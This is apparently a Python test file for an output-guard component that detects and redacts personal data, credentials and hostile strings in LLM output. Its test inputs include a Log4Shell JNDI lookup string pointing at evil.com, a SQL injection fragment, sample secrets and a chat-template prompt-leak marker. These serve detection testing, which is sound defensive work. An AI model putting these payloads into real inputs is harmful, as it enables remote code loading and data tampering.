"""PicoWatch OutputGuard tests."""

from pathlib import Path

import pytest

from picosentry.watch.config import PicoWatchConfig
from picosentry.watch.output_guard import OutputGuard, SchemaTooLargeError

RULES_DIR = Path(__file__).parent.parent.parent / "picosentry" / "watch" / "rules"
OUTPUT_RULES_DIR = RULES_DIR / "output_policy"


def _make_config(rules_dir: Path, **overrides) -> PicoWatchConfig:
    """Create a PicoWatchConfig with a rules_dir and optional overrides."""
    config = PicoWatchConfig()
    config.rules_dir = rules_dir
    for k, v in overrides.items():
        setattr(config, k, v)
    return config


class TestOutputGuard:
    """Test L6 OutputGuard."""

    def test_clean_output_passes(self) -> None:
        """Clean output with no violations passes."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("The weather is sunny today.")
        assert result.valid is True
        assert result.score < 0.4

    def test_pii_ssn_detected(self) -> None:
        """SSN in output is detected and redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("Your SSN is 123-45-6789")
        assert "out_pii_ssn" in result.violations
        assert result.redacted is not None
        assert "[SSN-REDACTED]" in result.redacted

    def test_pii_email_detected(self) -> None:
        """Email in output is detected and redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("Contact admin@example.com for help")
        assert "out_pii_email" in result.violations
        assert "[EMAIL-REDACTED]" in (result.redacted or "")

    def test_api_key_detected(self) -> None:
        """AWS API key pattern is detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("The key is AKIAIOSFODNN7EXAMPLE")
        assert "out_pii_api_key" in result.violations

    def test_schema_validation_type_mismatch(self) -> None:
        """Schema type mismatch is detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate('"hello"', schema={"type": "object"})
        assert "out_fmt_type_mismatch" in result.violations

    def test_schema_validation_missing_required(self) -> None:
        """Missing required fields are detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate('{"name": "test"}', schema={"type": "object", "required": ["name", "email"]})
        assert "out_fmt_missing_required_email" in result.violations

    def test_internal_url_detected(self) -> None:
        """Internal/private URLs are detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("The server is at 192.168.1.100")
        assert "out_exfil_internal_url" in result.violations

    def test_deterministic(self) -> None:
        """Same input + same rules = same result."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        text = "Your SSN is 123-45-6789"
        result1 = guard.validate(text)
        result2 = guard.validate(text)
        assert result1.score == result2.score
        assert result1.violations == result2.violations

    def test_jwt_detected(self) -> None:
        """JWT token in output is detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("Token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNrg0xMlYnJ3xL5w")
        assert "out_pii_jwt" in result.violations

    def test_ssh_key_detected(self) -> None:
        """SSH private key in output is detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA")
        assert "out_exfil_ssh_key" in result.violations

    def test_database_url_detected(self) -> None:
        """Database connection string in output is detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("postgres://user:pass@127.0.0.1:5432/testdb")
        assert "out_exfil_database_url" in result.violations

    def test_log4shell_detected(self) -> None:
        """Log4Shell JNDI string in output is detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("${jndi:ldap://evil.com/a}")
        assert "out_fmt_log4shell" in result.violations

    def test_sql_injection_detected(self) -> None:
        """SQL injection in output field is detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("name value: ' OR 1=1 --")
        assert "out_fmt_sql_injection" in result.violations

    def test_malware_instructions_detected(self) -> None:
        """Malware creation instructions in output are detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("how to create a ransomware")
        assert "out_harm_malware" in result.violations

    def test_aws_arn_detected(self) -> None:
        """AWS ARN in output is detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("arn:aws:s3:::my-bucket/key")
        assert "out_pii_aws_arn" in result.violations

    def test_prompt_marker_leak_detected(self) -> None:
        """LLM prompt markers leaked in output are detected."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("<|im_start|>system\nYou are helpful")
        assert "out_fmt_prompt_leak_marker" in result.violations

    def test_benign_ip_not_flagged_at_low_weight(self) -> None:
        """Public IP in benign context has low weight."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("The server is at 8.8.8.8")
        # IP rule weight is 0.70, should trigger but may not block alone
        assert "out_pii_ip_address" in result.violations

    def test_credit_card_detected_and_redacted(self) -> None:
        """Credit card number is detected and redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("Card: 4111-1111-1111-1111")
        assert "out_pii_credit_card" in result.violations
        assert result.redacted is not None
        assert "[CC-REDACTED]" in result.redacted

    def test_passport_detected_and_redacted(self) -> None:
        """Passport/national ID is detected and redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("Passport: AB1234567")
        assert "out_pii_passport" in result.violations
        assert result.redacted is not None
        assert "[PASSPORT-REDACTED]" in result.redacted

    def test_crypto_wallet_detected_and_redacted(self) -> None:
        """Crypto wallet address is detected and redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("Send to 0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18")
        assert "out_pii_crypto_wallet" in result.violations
        assert result.redacted is not None
        assert "[CRYPTO-WALLET-REDACTED]" in result.redacted

    def test_oauth_token_detected_and_redacted(self) -> None:
        """OAuth token is detected and redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("ya29.a0AfH6SMBxVeryLongTokenString1234567890")
        assert "out_exfil_oauth_token" in result.violations
        assert result.redacted is not None
        assert "[OAUTH-TOKEN-REDACTED]" in result.redacted

    def test_docker_secret_detected_and_redacted(self) -> None:
        """Docker/K8s secret is detected and redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("KUBERNETES_SERVICE_HOST=10.0.0.1")
        assert "out_exfil_docker_secret" in result.violations
        assert result.redacted is not None
        assert "[K8S-SECRET-REDACTED]" in result.redacted

    def test_env_var_detected_and_redacted(self) -> None:
        """Environment variable exfiltration is detected and redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY")
        assert "out_exfil_env_var" in result.violations
        assert result.redacted is not None
        assert "[ENV-VAR-REDACTED]" in result.redacted

    def test_jwt_redacted(self) -> None:
        """JWT token is redacted in output."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("Token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNrg0xMlYnJ3xL5w")
        assert "out_pii_jwt" in result.violations
        assert result.redacted is not None
        assert "[JWT-REDACTED]" in result.redacted

    def test_db_url_redacted(self) -> None:
        """Database connection string is redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("postgres://user:pass@127.0.0.1:5432/testdb")
        assert "out_exfil_database_url" in result.violations
        assert result.redacted is not None
        assert "[DB-URL-REDACTED]" in result.redacted

    def test_ssh_key_redacted(self) -> None:
        """SSH private key is redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA\n-----END RSA PRIVATE KEY-----")
        assert "out_exfil_ssh_key" in result.violations
        assert result.redacted is not None
        assert "[PRIVATE-KEY-REDACTED]" in result.redacted

    def test_aws_arn_redacted(self) -> None:
        """AWS ARN is redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("arn:aws:s3:::my-bucket/key")
        assert "out_pii_aws_arn" in result.violations
        assert result.redacted is not None
        assert "[AWS-ARN-REDACTED]" in result.redacted

    def test_internal_url_redacted(self) -> None:
        """Internal URL is redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("The server is at 192.168.1.100")
        assert "out_exfil_internal_url" in result.violations
        assert result.redacted is not None
        assert "[INTERNAL-URL-REDACTED]" in result.redacted

    def test_multiple_pii_types(self) -> None:
        """Multiple PII types in one output are all detected and redacted."""
        config = _make_config(RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("SSN: 123-45-6789, email: test@example.com, key: AKIAIOSFODNN7EXAMPLE")
        assert "out_pii_ssn" in result.violations
        assert "out_pii_email" in result.violations
        assert "out_pii_api_key" in result.violations
        assert result.redacted is not None
        assert "[SSN-REDACTED]" in result.redacted
        assert "[EMAIL-REDACTED]" in result.redacted
        assert "[API-KEY-REDACTED]" in result.redacted



class TestOutputGuardSchemaLimits:
    """Runtime JSON schema size/depth limits."""

    def test_schema_within_limits_passes(self) -> None:
        config = _make_config(RULES_DIR, max_json_schema_nodes=10, max_json_schema_depth=3)
        guard = OutputGuard(config=config)
        result = guard.validate("{}", schema={"type": "object"})
        assert result.valid is True

    def test_schema_exceeding_node_count_rejected(self) -> None:
        config = _make_config(RULES_DIR, max_json_schema_nodes=3, max_json_schema_depth=10)
        guard = OutputGuard(config=config)
        with pytest.raises(SchemaTooLargeError):
            guard.validate("{}", schema={"a": {"b": {"c": {}}}})

    def test_schema_exceeding_depth_rejected(self) -> None:
        config = _make_config(RULES_DIR, max_json_schema_nodes=100, max_json_schema_depth=2)
        guard = OutputGuard(config=config)
        with pytest.raises(SchemaTooLargeError):
            guard.validate("{}", schema={"a": {"b": {"c": {}}}})
